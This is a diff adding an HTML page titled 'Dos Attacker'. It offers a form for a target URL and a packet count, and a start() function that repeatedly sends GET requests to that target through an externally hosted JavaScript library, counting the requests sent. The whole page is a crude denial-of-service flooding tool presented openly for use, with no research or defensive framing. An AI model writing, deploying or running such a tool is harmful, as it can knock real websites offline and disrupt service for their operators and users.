@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Dos Attacker</title>
+</head>
+<body>
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+<script src="https://mr-r0ot.github.io/roker.js_library/roker3.3.3/roker.js"></script>
+<script>if($is_new_user()==true){$UI_Create('<p class="alert-success">Hello '+$browser_userAgent()+' Welcom To Doser!</p>');}</script>
+    <p class="alert-info">Packet Sended: </p>
+    <p class="alert-info" id="nb">0</p>
+    <div class="form-group">
+        <label for="usr">Name:</label>
+        <input type="text" class="form-control" id="url">
+        </div>
+        <div class="form-group">
+        <label for="pwd">Number Packet:</label>
+        <input type="number" class="form-control" id="number_for_send">
+    </div>
+    <button onclick="start()" class="btn btn-info">Start</button>
+    <script>
+        function start(){
+            var ul = $get_text_by_id("url");
+            var number_for_send= $int($get_text_by_id("number_for_send"));        
+            $show_box('Starting Attack...\n\nTarget: '+ul+' \nNumber Packet Attack: '+number_for_send);
+            for(var x=0;x<number_for_send;x++){
+                $request_get_openurl(ul);
+                $set_textContent_by_id("nb", $int($get_textContent_by_id("nb"))+1 );
+            }
+        }
+    </script>
+</body>
+</html>
